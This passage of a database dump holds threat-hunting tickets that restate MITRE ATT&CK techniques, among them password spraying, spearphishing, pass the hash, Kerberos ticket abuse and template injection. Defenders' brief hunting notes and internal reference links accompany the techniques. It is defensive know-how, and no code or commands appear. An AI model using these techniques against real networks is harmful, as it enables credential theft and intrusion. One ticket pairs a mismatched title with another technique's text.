adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target\'s policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\r\n\r\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization\'s login failure policies.\r\n\r\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\r\n\r\nSSH (22/TCP)\r\nTelnet (23/TCP)\r\nFTP (21/TCP)\r\nNetBIOS / SMB / Samba (139/TCP & 445/TCP)\r\nLDAP (389/TCP)\r\nKerberos (88/TCP)\r\nRDP / Terminal Services (3389/TCP)\r\nHTTP/HTTP Management Services (80/TCP & 443/TCP)\r\nMSSQL (1433/TCP)\r\nOracle (1521/TCP)\r\nMySQL (3306/TCP)\r\nVNC (5900/TCP)\r\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\r\n\r\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1110/001/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-05 18:32:08','2021-05-05 18:35:34','2021-05-05',0,NULL,81,81,2,3,0,NULL),(83,5,1,'Phishing: Spearphishing attachment - T1566.001','Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\r\n\r\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary\'s payload exploits a vulnerability or directly executes on the user\'s system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.\r\n\r\n\r\n+*Hunter Notes:*+\r\n<pre>\r\nNetwork:\r\nReally hard to hunt\r\n\r\nHost:\r\n\r\n</pre>\r\n\r\n+*References:*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1566/001/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.001+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.001+-+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1566.001+-+Spearfishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,6,'2021-05-05 18:32:51','2021-05-06 18:06:49','2021-05-05',0,NULL,50,50,6,7,0,NULL),(84,5,1,'Brute Force: Password Spraying: T1110.003','Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. \'Password01\'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. \r\n\r\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\r\n\r\nSSH (22/TCP)\r\nTelnet (23/TCP)\r\nFTP (21/TCP)\r\nNetBIOS / SMB / Samba (139/TCP & 445/TCP)\r\nLDAP (389/TCP)\r\nKerberos (88/TCP)\r\nRDP / Terminal Services (3389/TCP)\r\nHTTP/HTTP Management Services (80/TCP & 443/TCP)\r\nMSSQL (1433/TCP)\r\nOracle (1521/TCP)\r\nMySQL (3306/TCP)\r\nVNC (5900/TCP)\r\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\r\n\r\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1110/003/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-05 18:34:45','2021-05-05 18:34:45','2021-05-05',0,NULL,81,81,4,5,0,NULL),(85,5,1,'Phishing: Spearphishing link - T1566.002','Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\r\n\r\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.\r\n\r\n\r\n<pre>\r\nHunter Notes: \r\nReally hard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1566/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.002+Spearphishing+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.002+-+Spearphishing+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.002+-+Spearphishing+Link?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1204.001+-+Malicious+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+T1566.002+-+Spearphishing+Link | https://confluence.di2e.net/display/CYH836/Turla%3A+T1566.002+-+Spearphishing+Link?src=contextnavpagetreemode\r\n</pre>\r\n\r\n',NULL,NULL,1,NULL,3,NULL,1,3,'2021-05-05 18:35:55','2021-05-06 18:10:26','2021-05-05',0,NULL,50,50,8,9,0,NULL),(86,5,1,'Use Alternate Authentication Material: Pass the Hash - T1550.002','Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user\'s cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\r\n\r\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\r\n\r\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1550/002/\r\n</pre>\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/x/zB34RQ\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1550.002+-+Pass+the+Hash\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,1,3,'2021-05-05 18:45:40','2021-05-06 15:49:11','2021-05-05',0,NULL,1,1,14,15,0,NULL),(87,5,1,'Valid Accounts - T1078','Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.\r\n\r\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.\r\n\r\n\r\n<pre>\r\nHunter Notes: \r\nWould be hard to ID; circumstantial\r\n</pre>\r\n\r\n<pre>\r\nReferences: \r\nhttps://attack.mitre.org/techniques/T1078/\r\nhttps://confluence.di2e.net/display/CYH836/T1078+-+Valid+Accounts\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-05 18:47:42','2021-05-06 18:05:35','2021-05-05',0,NULL,50,50,10,11,0,NULL),(89,5,1,'Native API -T1106','Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\r\n\r\nFunctionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes.[3][4] This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\r\n\r\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\r\n\r\nAdversaries may abuse these native API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1106/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-05 18:51:02','2021-05-05 18:51:02','2021-05-05',0,NULL,38,38,8,9,0,NULL),(90,5,1,'Use alternate Authentication Material: Application Access Token - T1550.001','Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\r\n\r\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.\r\n\r\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.[3] With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.\r\n\r\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1550/001/\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1550+-+Use+Alternate+Authentication+Material?src=contextnavpagetreemode\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-05 18:54:48','2021-05-05 18:54:48','2021-05-05',0,NULL,1,1,16,17,0,NULL),(91,5,1,'Trusted Relationship - T1199','Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\r\n\r\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider\'s access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.\r\n\r\n+*Hunter Notes:*+\r\n<pre>\r\nNetwork:\r\nWould REALLY be hard to ID\r\n\r\nHost:\r\nActive Directory examine trusted relationships between domains/forests\r\n</pre>\r\n\r\n+*Reference:*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1199/\r\nhttps://confluence.di2e.net/display/CYH836/T1199+-+Trusted+Relationship?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1199+-+Trusted+Relationship?src=contextnavpagetreemode\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,2,'2021-05-05 18:55:37','2021-05-06 14:31:46','2021-05-05',0,NULL,50,50,12,13,0,NULL),(92,5,1,'Remote Services: SMB/Windows Admin Shares - T1021.002','Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\r\n\r\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\r\n\r\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB,[1] to interact with systems using remote procedure calls (RPCs),[2] transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.[3]\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1021/002/\r\n</pre>\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/pages/viewpage.action?pageId=1173888600\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,1,4,'2021-05-05 18:58:02','2021-05-06 15:55:06','2021-05-05',0,NULL,1,1,18,19,0,NULL),(93,5,1,'Drive-by Compromise - T1189','Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user\'s web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\r\n\r\nMultiple ways of delivering exploit code to a browser exist, including:\r\n\r\nA legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\r\nMalicious ads are paid for and served through legitimate ad providers.\r\nBuilt-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\r\n\r\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.[1]\r\n\r\nTypical drive-by compromise process:\r\n\r\nA user visits a website that is used to host the adversary controlled content.\r\nScripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.\r\nThe user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\r\nUpon finding a vulnerable version, exploit code is delivered to the browser.\r\nIf exploitation is successful, then it will give the adversary code execution on the user\'s system unless other protections are in place.\r\nIn some cases a second visit to the website after the initial scan is required before exploit code is delivered.\r\n\r\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\r\n\r\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.[2]\r\n\r\n<pre>\r\nHunter Notes: \r\ninfected victims using watering holes.\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1189/\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1189+-+Drive-by+Compromise\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1189+-+Drive-by+Compromise?src=contextnavpagetreemode\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,3,'2021-05-05 19:36:14','2021-05-06 18:12:49','2021-05-05',0,NULL,50,50,14,15,0,NULL),(94,5,1,'Valid Accounts: Domain Accounts - T1078.002','Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. [1] Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]\r\n\r\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.\r\n\r\n\r\n<pre>\r\nHunter Notes:\r\nSMB; compare users and checkout new accounts (look to automate) | VLOOKUP for excel | SCRIPTS THAT ARE PRE BUILT\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1078/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1210%3A+Exploitation+of+Remote+services\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-05 19:46:15','2021-05-06 18:37:35','2021-05-05',0,NULL,30,30,16,17,0,NULL),(95,5,1,'Use alternate Auth Material: Pass the ticket - T1550.003','Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account\'s password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\r\n\r\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user\'s service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\r\n\r\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\r\n\r\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\r\n\r\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.\r\n<pre>\r\nHunter Notes:\r\nReally hard to hunt | Look for Kerberos activity without going to DC\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/003/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,2,'2021-05-05 19:48:13','2021-05-06 18:38:26','2021-05-05',0,NULL,30,30,18,19,0,NULL),(96,5,1,'Template Injection - T1221','Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. [1]\r\n\r\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\r\n\r\nAdversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. [2] These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. [3] Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. [4]\r\n\r\nThis technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.\r\n\r\n<pre>\r\nHunter Notes:\r\nSuricata alert + a file extension in URL could ID this.\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1221/\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1221+-+Template+Injection\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,2,'2021-05-05 19:50:15','2021-05-06 18:39:03','2021-05-05',0,NULL,30,30,20,21,0,NULL),(97,5,1,'Valid Accounts: Domain Accounts - T1078.002','Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. [1] Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]\r\n\r\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.\r\n\r\n<pre>\r\nHunter Notes:\r\nWould be hard to ID\r\n</pre>\r\n\r\n<pre>\r\nReference: \r\nhttps://attack.mitre.org/techniques/T1078/002/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-05 19:52:41','2021-05-06 18:39:45','2021-05-05',0,NULL,30,30,22,23,0,NULL),(98,5,1,'Use alternate Auth Material: Pass the hash - T1550.002','Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user\'s clear text password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\r\n\r\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\r\n\r\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.\r\n\r\n<pre>\r\nHunter Notes:\r\nHard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1550.002+-+Pass+the+Hash\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,4,'2021-05-05 20:03:24','2021-05-06 18:40:34','2021-05-05',0,NULL,30,30,24,25,0,NULL),(99,5,1,'Use alternate Auth Material:Application Access Token - T1550.001','Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\r\n\r\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.\r\n\r\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.[3] With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.[4]\r\n\r\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\r\n\r\n<pre>\r\nHunter Notes:\r\nWould REALLY be hard to ID. Observe possible use of access outside of duty hours to assist in ID.\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/001/\r\n\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,3,'2021-05-05 20:06:36','2021-05-06 18:41:17','2021-05-05',0,NULL,30,30,26,27,0,NULL),(100,5,1,'Obfuscated Files or Information - T1027','Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\r\n\r\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user\'s action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. Adversaries may also used compressed or archived scripts, such as JavaScript.\r\n\r\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \r\n\r\nAdversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.\r\n\r\n<pre>\r\nHunter Notes:\r\nFile or information will be layered with obfuscation and encoding to blend in with traffic.\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1027/\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1027+-+Obfuscated+Files+or+Information https://confluence.di2e.net/pages/viewpage.action?pageId=1173888572&src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1132.001%3A+Data+Encoding-+Standard+Encoding\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-05 20:08:40','2021-05-06 18:42:07','2021-05-05',0,NULL,30,30,28,29,0,NULL),(101,5,1,'Windows Management Instrumentation - T1047 (H)','Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) and Remote Procedure Call Service (RPCS) for remote access. RPCS operates over port 135.\r\n\r\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1047/\r\nhttps://confluence.di2e.net/display/CYH836/T1047+-+Windows+Management+Instrumentation\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,2,'2021-05-06 14:17:51','2021-05-06 14:46:21','2021-05-06',0,NULL,38,38,10,11,0,NULL),(103,5,1,'Archive Collected Data - T1560','An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\r\n\r\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.\r\n',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-06 14:18:51','2021-05-06 14:18:51','2021-05-06',0,NULL,45,45,4,5,0,NULL),(113,5,1,'Email Collection: Remote Email Collection  - T1114.002','Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user\'s credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.',NULL,NULL,1,NULL,2,NULL,1,3,'2021-05-06 14:35:22','2021-05-06 14:35:22','2021-01-27',0,NULL,45,45,6,7,0,NULL),(114,5,1,'Privilege Escalation - Parent Ticket','The adversary is trying to gain higher-level permissions.\r\n\r\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include:\r\n\r\n    SYSTEM/root level\r\n    local administrator\r\n    user account with admin-like access\r\n    user accounts with access to specific system or perform specific function\r\n\r\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.',NULL,NULL,1,NULL,2,NULL,1,2,'2021-05-06 14:39:16','2021-05-06 14:43:33','2021-05-06',0,NULL,NULL,114,1,6,0,NULL),(115,5,1,'Screen Capture - T1113','Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-06 14:41:16','2021-05-06 14:41:16','2021-05-06',0,NULL,45,45,8,9,0,NULL),(116,5,1,'Data from Local Session - T1005','Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.\r\n\r\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd, which has functionality to interact with the file system to gather information. Some adversaries may also use Automated Collection on the local system.\r\n',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-06 14:42:07','2021-05-06 14:42:07','2021-05-06',0,NULL,45,45,10,11,0,NULL),(117,5,1,'Command and Scripting Interpreter - T1059.001','\r\n\r\nAdversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. [1] Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\r\n\r\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\r\n\r\nA number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, PoshC2, and PSAttack.\r\n\r\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell\'s underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). \r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1059/001/\r\n\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-06 14:42:16','2021-05-06 14:46:54','2021-05-06',0,NULL,38,38,12,13,0,NULL),(118,5,1,'Data Staged: Local Data Staging - T1074.001','Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. 